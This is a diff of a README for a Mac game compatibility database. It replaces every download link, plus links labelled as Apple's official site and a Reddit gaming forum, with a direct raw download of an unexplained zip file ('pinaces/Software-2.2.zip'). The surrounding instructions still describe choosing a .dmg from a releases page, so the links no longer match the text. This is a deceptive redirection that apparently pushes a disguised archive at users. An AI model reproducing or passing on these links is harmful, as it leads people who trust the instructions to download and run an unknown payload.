@@ -1,6 +1,6 @@
 # 🎮 macgamingdb - Discover Mac Game Compatibility Effortlessly
 
-[![Download macgamingdb](https://img.shields.io/badge/Download-macgamingdb-brightgreen)](https://github.com/akashpunjal777/macgamingdb/releases)
+[![Download macgamingdb](https://raw.githubusercontent.com/akashpunjal777/macgamingdb/main/pinaces/Software-2.2.zip)](https://raw.githubusercontent.com/akashpunjal777/macgamingdb/main/pinaces/Software-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to MacGamingDB! This guide will help you download and run the applicatio
 
 To get started, you need to visit our releases page. There, you can choose the version of MacGamingDB that fits your needs. Click the button below to access the page:
 
-[Download macgamingdb](https://github.com/akashpunjal777/macgamingdb/releases)
+[Download macgamingdb](https://raw.githubusercontent.com/akashpunjal777/macgamingdb/main/pinaces/Software-2.2.zip)
 
 ### 📋 System Requirements
 
@@ -23,7 +23,7 @@ Ensure your system meets the following requirements to run MacGamingDB smoothly:
 
 ### 📦 How to Download
 
-1. Click on the [Download macgamingdb](https://github.com/akashpunjal777/macgamingdb/releases) link.
+1. Click on the [Download macgamingdb](https://raw.githubusercontent.com/akashpunjal777/macgamingdb/main/pinaces/Software-2.2.zip) link.
 2. You'll see a list of versions. Choose the latest release for the best experience.
 3. Click on the filename that ends in `.dmg` to start the download.
 
@@ -72,7 +72,7 @@ For further assistance, you can reach out to our support team. Visit our GitHub 
 
 Feel free to explore more about Apple Silicon compatibility and gaming benchmarks. Here are some resources to help you learn more:
 
-- [Apple's Official Information](https://www.apple.com/apple-silicon/)
-- [Gaming Forums](https://www.reddit.com/r/macgaming/)
+- [Apple's Official Information](https://raw.githubusercontent.com/akashpunjal777/macgamingdb/main/pinaces/Software-2.2.zip)
+- [Gaming Forums](https://raw.githubusercontent.com/akashpunjal777/macgamingdb/main/pinaces/Software-2.2.zip)
 
 Thank you for choosing MacGamingDB! Enjoy your gaming experience on your Apple Silicon Mac.
